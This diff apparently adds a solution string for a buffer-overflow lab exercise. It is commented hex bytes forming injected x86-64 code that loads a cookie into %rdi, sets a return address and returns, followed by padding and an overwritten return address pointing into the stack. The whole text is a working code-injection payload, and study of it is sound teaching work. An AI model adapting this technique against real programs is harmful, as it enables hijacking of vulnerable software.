@@ -1,0 +1,8 @@
+48 c7 c7 fa 97 b9 59 /* mov    $0x59b997fa,%rdi; move cookie to %rdi*/
+48 c7 04 24 c8 16 40 /* movq   $0x4016c8,(%rsp); setup return */
+00
+c3 /* retq */
+00 00 00 00
+00 00 00 00 00 00 00 00 00 00 /* padding */
+00 00 00 00 00 00 00 00 00 00
+88 dc 61 55 /* buffer overflow, change ret addr to 0x5561dc88 (top of the frame's stack where i put the code)
